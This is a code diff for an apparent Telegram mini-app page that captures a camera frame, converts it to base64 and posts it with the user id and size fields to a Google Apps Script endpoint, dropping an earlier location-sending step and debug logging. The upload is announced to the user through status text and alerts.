@@ -181,7 +181,6 @@
 
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        //const base64 = canvas.toDataURL("image/jpeg", 0.8);
 
         status.innerText = "📤 Mengirim ke server...";
 
@@ -193,96 +192,49 @@
         canvas.toBlob(
           async (blob) => {
             if (!blob) {
-              tg.showAlert("❌ Kamera gagal membuat foto!");
               return;
             }
+            const sizeKB = (blob.size / 1024).toFixed(2);
 
-            debug("Blob created, size: " + blob.size + " bytes");
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
 
-            // Ambil server_url dari query
-            const params = new URLSearchParams(window.location.search);
-            const SERVER_URL = params.get("server_url");
+            reader.onloadend = async function () {
+              const base64data = reader.result;
+              const base64Length = base64data.length;
+              const base64KB = (base64Length / 1024).toFixed(2);
 
-            debug("SERVER_URL: " + SERVER_URL);
+              // KIRIM SEBAGAI FORMDATA DENGAN BASE64 STRING
+              const formData = new FormData();
+              formData.append("size_bytes", blob.size);
+              formData.append("size_kb", sizeKB);
+              formData.append("base64_length", base64Length);
+              formData.append(
+                "user_id",
+                tg.initDataUnsafe?.user?.id || "unknown"
+              );
+              formData.append("timestamp", new Date().toISOString());
+              formData.append("photo_base64", base64data); // ← BASE64 STRING
 
-            if (!SERVER_URL) {
-              tg.showAlert("❌ Server URL tidak ditemukan!");
-              return;
-            }
+              const startTime = Date.now();
 
-            // Cek lastLocation
-            debug("lastLocation: " + JSON.stringify(lastLocation));
-
-            if (!lastLocation || lastLocation === null) {
-              tg.showAlert("⚠️ Lokasi belum didapat, coba lagi!");
-              return;
-            }
-
-            let chatId;
-            try {
-              chatId = tg.initDataUnsafe?.user?.id || "unknown";
-              debug("chat_id: " + chatId);
-            } catch (e) {
-              debug("ERROR getting chat_id: " + e.message);
-              chatId = "error";
-            }
-
-            debug("Creating FormData...");
-            const form = new FormData();
-
-            try {
-              form.append("chat_id", chatId);
-
-              // PENTING: Convert blob to base64 untuk Google Apps Script
-              const reader = new FileReader();
-              reader.readAsDataURL(blob);
-
-              reader.onloadend = async function () {
-                const base64data = reader.result;
-                debug(
-                  "Photo converted to base64, length: " + base64data.length
-                );
-
-                // Kirim sebagai base64 string, bukan blob
-                form.append("photo", base64data);
-                form.append("location", JSON.stringify(lastLocation));
-                form.append("latitude", lastLocation.latitude);
-                form.append("longitude", lastLocation.longitude);
-
-                debug("FormData prepared with base64 photo");
-
-                try {
-                  debug("Starting fetch...");
-
-                  // Google Apps Script perlu mode: "no-cors" karena redirect
-                  const response = await fetch(SERVER_URL, {
-                    method: "POST",
-                    mode: "no-cors", // HARUS ada untuk Google Apps Script
-                    body: form,
-                  });
-
-                  debug("Fetch sent (no-cors mode)");
-                  tg.showAlert("📤 Foto & lokasi dikirim!");
-
-                  // Optional: close after success
-                  // setTimeout(() => tg.close(), 2000);
-                } catch (err) {
-                  debug("Fetch ERROR: " + err.message);
-                  tg.showAlert("❌ Gagal kirim: " + err.message);
-                }
-              };
-
-              reader.onerror = function (error) {
-                debug("FileReader ERROR: " + error);
-                tg.showAlert("❌ Gagal convert foto!");
-              };
-            } catch (e) {
-              debug("ERROR: " + e.message);
-              tg.showAlert("❌ Error: " + e.message);
-            }
+              try {
+                await fetch(APPS_SCRIPT_URL, {
+                  method: "POST",
+                  mode: "no-cors",
+                  body: formData,
+                });
+                tg.showAlert(`✅ sent (no-cors)! Check server logs`);
+              } catch (e) {
+                tg.showAlert("❌ Failed to send");
+              }
+            };
+            reader.onerror = function (error) {
+              tg.showAlert("❌ Failed to convert to base64");
+            };
           },
           "image/jpeg",
-          0.5
+          0.9
         );
       });
     </script>
